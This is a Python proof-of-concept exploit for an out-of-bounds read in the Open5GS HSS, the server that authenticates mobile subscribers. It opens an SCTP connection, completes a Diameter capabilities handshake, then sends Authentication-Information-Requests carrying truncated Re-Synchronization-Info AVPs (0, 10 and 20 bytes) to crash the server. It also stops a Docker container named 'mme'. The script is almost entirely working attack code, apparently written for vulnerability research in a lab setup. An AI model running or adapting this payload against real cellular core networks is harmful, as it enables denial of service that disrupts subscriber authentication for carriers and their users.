#!/usr/bin/env python3
"""
PoC-1: Open5GS HSS S6a AIR Re-Synchronization-Info Out-of-Bounds Read
======================================================================
Vulnerability: CWE-125 Out-of-bounds Read
Affected:      Open5GS src/hss/hss-s6a-path.c hss_ogs_diam_s6a_air_cb()

Root cause:    ogs_auc_sqn() reads from os.data at:
                 offset  0: RAND (16 bytes) -> milenage_f2345()
                 offset 16: conc_sqn (6 bytes) -> XOR with ak
                 offset 22: MAC_S (8 bytes) -> memcmp()
               Total required: 30 bytes. Code never checks os.len >= 30.

Trigger msg:   S6a Authentication-Information-Request (CC=318, AppID=16777251)
Trigger AVP:   Requested-EUTRAN-Authentication-Info (1408, V=10415)
               -> Re-Synchronization-Info (1411, V=10415) with len < 30
               NOTE: AVP code 1411 (not 1413). Code 1413 is Authentication-Info (Grouped).

Expected:      ASAN heap-buffer-overflow in ogs_auc_sqn() or SIGSEGV
"""
import socket
import struct
import sys
import time

HSS_HOST = "172.22.0.3"
HSS_PORT = 3868

# ---------- Diameter wire-format helpers ----------

def pad4(data):
    r = len(data) % 4
    return data + (b'\x00' * (4 - r)) if r else data

def make_avp(code, data, vendor_id=0, flags=0x40):
    if vendor_id:
        flags |= 0x80
    avp_len = 8 + len(data)
    if vendor_id:
        avp_len += 4
    hdr = struct.pack("!I", code)
    hdr += struct.pack("!I", (flags << 24) | avp_len)
    if vendor_id:
        hdr += struct.pack("!I", vendor_id)
    return hdr + pad4(data)

def make_msg(cmd_code, app_id, flags, hop_id, end_id, avps_bytes):
    body = avps_bytes
    msg_len = 20 + len(body)
    hdr = struct.pack("!B", 1)
    hdr += struct.pack("!I", msg_len)[1:]
    hdr += struct.pack("!B", flags)
    hdr += struct.pack("!I", cmd_code)[1:]
    hdr += struct.pack("!I", app_id)
    hdr += struct.pack("!I", hop_id)
    hdr += struct.pack("!I", end_id)
    return hdr + body

# ---------- AVP constants ----------
AVP_SESSION_ID        = 263
AVP_ORIGIN_HOST       = 264
AVP_ORIGIN_REALM      = 296
AVP_DEST_HOST         = 293
AVP_DEST_REALM        = 283
AVP_USER_NAME         = 1
AVP_AUTH_SESSION_STATE= 277
AVP_VISITED_PLMN_ID   = 1407
AVP_REQ_EUTRAN_AUTH   = 1408
AVP_RE_SYNC_INFO      = 1411

VENDOR_3GPP = 10415
APP_S6A = 16777251

def build_cer():
    avps = b""
    avps += make_avp(AVP_ORIGIN_HOST, b"mme.epc.mnc099.mcc460.3gppnetwork.org")
    avps += make_avp(AVP_ORIGIN_REALM, b"epc.mnc099.mcc460.3gppnetwork.org")
    avps += make_avp(257, struct.pack("!H4s", 1, socket.inet_aton("172.22.0.9")))
    avps += make_avp(266, struct.pack("!I", VENDOR_3GPP))
    avps += make_avp(269, b"PoC-Client")
    # Vendor-Specific-Application-Id for S6a
    vsa = make_avp(266, struct.pack("!I", VENDOR_3GPP), flags=0x40)
    vsa += make_avp(258, struct.pack("!I", APP_S6A), flags=0x40)
    avps += make_avp(260, vsa, flags=0x40)
    return make_msg(257, 0, 0x80, 1, 1, avps)

def build_air_short_resync(resync_len, hop_id, end_id):
    avps = b""
    avps += make_avp(AVP_SESSION_ID, b"mme.epc.mnc099.mcc460.3gppnetwork.org;sess1;1")
    avps += make_avp(AVP_USER_NAME, b"460990000000001")
    avps += make_avp(AVP_ORIGIN_HOST, b"mme.epc.mnc099.mcc460.3gppnetwork.org")
    avps += make_avp(AVP_ORIGIN_REALM, b"epc.mnc099.mcc460.3gppnetwork.org")
    avps += make_avp(AVP_DEST_HOST, b"hss.epc.mnc099.mcc460.3gppnetwork.org")
    avps += make_avp(AVP_DEST_REALM, b"epc.mnc099.mcc460.3gppnetwork.org")
    avps += make_avp(AVP_AUTH_SESSION_STATE, struct.pack("!I", 1))
    avps += make_avp(1032, struct.pack("!I", 1004), vendor_id=VENDOR_3GPP)  # RAT-Type = EUTRAN
    avps += make_avp(AVP_VISITED_PLMN_ID, b'\x64\xf0\x99', vendor_id=VENDOR_3GPP)

    short_data = b'\x41' * resync_len
    inner_avp = make_avp(AVP_RE_SYNC_INFO, short_data, vendor_id=VENDOR_3GPP, flags=0x80)
    # Add Number-Of-Requested-Vectors=1 before Re-Synchronization-Info
    num_vec = make_avp(1410, struct.pack("!I", 1), vendor_id=VENDOR_3GPP)
    outer_data = num_vec + inner_avp
    avps += make_avp(AVP_REQ_EUTRAN_AUTH, outer_data, vendor_id=VENDOR_3GPP, flags=0x80)

    return make_msg(318, APP_S6A, 0x80, hop_id, end_id, avps)

def build_air_no_resync(hop_id, end_id):
    avps = b""
    avps += make_avp(AVP_SESSION_ID, b"mme.epc.mnc099.mcc460.3gppnetwork.org;sess2;1")
    avps += make_avp(AVP_USER_NAME, b"460990000000001")
    avps += make_avp(AVP_ORIGIN_HOST, b"mme.epc.mnc099.mcc460.3gppnetwork.org")
    avps += make_avp(AVP_ORIGIN_REALM, b"epc.mnc099.mcc460.3gppnetwork.org")
    avps += make_avp(AVP_DEST_HOST, b"hss.epc.mnc099.mcc460.3gppnetwork.org")
    avps += make_avp(AVP_DEST_REALM, b"epc.mnc099.mcc460.3gppnetwork.org")
    avps += make_avp(AVP_AUTH_SESSION_STATE, struct.pack("!I", 1))
    avps += make_avp(1032, struct.pack("!I", 1004), vendor_id=VENDOR_3GPP)  # RAT-Type = EUTRAN
    avps += make_avp(AVP_VISITED_PLMN_ID, b'\x64\xf0\x99', vendor_id=VENDOR_3GPP)
    inner = make_avp(1410, struct.pack("!I", 1), vendor_id=VENDOR_3GPP)
    avps += make_avp(AVP_REQ_EUTRAN_AUTH, inner, vendor_id=VENDOR_3GPP, flags=0xc0)
    return make_msg(318, APP_S6A, 0x80, hop_id, end_id, avps)

def recv_diam(sock, timeout_sec=5):
    sock.settimeout(timeout_sec)
    try:
        hdr = sock.recv(4)
        if len(hdr) < 4:
            return None
        msg_len = struct.unpack("!I", b'\x00' + hdr[1:4])[0]
        remaining = msg_len - 4
        body = b""
        while remaining > 0:
            chunk = sock.recv(remaining)
            if not chunk:
                return None
            body += chunk
            remaining -= len(chunk)
        return hdr + body
    except socket.timeout:
        return None

def main():
    target = sys.argv[1] if len(sys.argv) > 1 else HSS_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else HSS_PORT

    print(f"[*] PoC-1: Open5GS S6a AIR Re-Synchronization-Info OOB Read")
    print(f"[*] Target: {target}:{port} (SCTP)")
    print(f"[*] Required Re-Synch-Info length: 30 bytes (RAND=16 + SQN=6 + MAC_S=8)")
    print()

    # Stop MME and restart HSS to ensure clean SCTP association
    import subprocess
    try:
        subprocess.run(["docker", "stop", "mme"], capture_output=True, timeout=10)

        time.sleep(10)
    except Exception:
        pass

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_SCTP)
    sock.settimeout(10)
    try:
        sock.connect((target, port))
        print("[+] SCTP connected")
    except Exception as e:
        print(f"[-] Connect failed: {e}")
        return

    try:
        # Step 1: CER/CEA
        print("[*] Step 1: CER/CEA handshake...")
        sock.sendall(build_cer())
        cea = recv_diam(sock, 5)
        if not cea:
            print("[-] No CEA received")
            return
        cea_len = struct.unpack("!I", b'\x00' + cea[1:4])[0]
        print(f"[+] CEA received: length={cea_len}")
        time.sleep(0.5)

        # Step 2: Normal AIR baseline
        print("[*] Step 2: Normal AIR (no Re-Synch-Info)...")
        air_normal = build_air_no_resync(10, 10)
        print(f"[*] Normal AIR hex ({len(air_normal)} bytes):")
        print(air_normal.hex())
        sock.sendall(air_normal)
        resp = recv_diam(sock, 5)
        if resp:
            print(f"[+] AIA received ({len(resp)} bytes) - HSS is alive")
        else:
            print("[-] No response to normal AIR")

        # Step 3: AIR with short Re-Synchronization-Info
        for test_len in [10, 20, 0]:
            print(f"\n[*] Step 3: AIR with Re-Synch-Info length={test_len} (need 30)...")
            if test_len < 30:
                print(f"[*]   OOB READ: {30 - test_len} bytes past buffer!")

            air_poc = build_air_short_resync(test_len, 20 + test_len, 20 + test_len)
            print(f"[*] PoC AIR hex ({len(air_poc)} bytes):")
            print(air_poc.hex())
            sock.sendall(air_poc)
            resp = recv_diam(sock, 5)
            if resp:
                print(f"[+] Got response ({len(resp)} bytes)")
            else:
                print("[!] No response - HSS may have crashed or closed connection!")
                break

        print("\n[*] Done.")
    finally:
        sock.close()

if __name__ == "__main__":
    main()
